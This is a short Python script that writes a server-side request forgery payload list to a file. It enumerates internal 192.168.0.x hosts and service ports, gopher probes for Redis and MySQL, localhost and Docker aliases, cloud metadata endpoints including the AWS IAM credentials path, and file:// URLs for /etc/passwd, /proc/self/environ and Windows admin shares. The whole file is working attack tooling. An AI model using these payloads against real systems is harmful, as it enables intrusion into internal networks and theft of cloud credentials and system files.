ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 465, 587, 631, 8080, 8443, 9000, 9200, 3306, 6379, 5984]

base_ip = "192.168.0."
ip_range = range(1, 256)

gopher_ports = [11211, 6379, 3306]

extra_targets = [
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "10.0.0.1",
    "172.16.0.1",
    "host.docker.internal",
    "docker.for.mac.localhost",
    "docker.for.win.localhost",
]

cloud_metadata = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
]

file_urls = [
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///var/log/auth.log",
    "file:///windows/win.ini",
    "file://\\127.0.0.1\\c$",
    "file://\\192.168.0.1\\c$",
]

with open("full_ssrf_payloads.txt", "w") as f:
    # 192.168.0.0/24 IPs
    for i in ip_range:
        ip = base_ip + str(i)
        f.write(f"http://{ip}\n")
        f.write(f"https://{ip}\n")
        for port in ports:
            f.write(f"http://{ip}:{port}\n")
            f.write(f"https://{ip}:{port}\n")
        for gport in gopher_ports:
            f.write(f"gopher://{ip}:{gport}/_PING\n")
            f.write(f"gopher://{ip}:{gport}/_INFO\n")

    # Internal/localhost
    for target in extra_targets:
        f.write(f"http://{target}\n")
        for port in ports:
            f.write(f"http://{target}:{port}\n")

    # Gopher payloads
    f.write("gopher://127.0.0.1:6379/_PING\n")
    f.write("gopher://127.0.0.1:6379/_INFO\n")
    f.write("gopher://127.0.0.1:3306/_\n")

    # Cloud metadata
    for meta in cloud_metadata:
        f.write(meta + "\n")

    # File scheme
    for file_path in file_urls:
        f.write(file_path + "\n")

print("[+] Payload list saved to full_ssrf_payloads.txt")

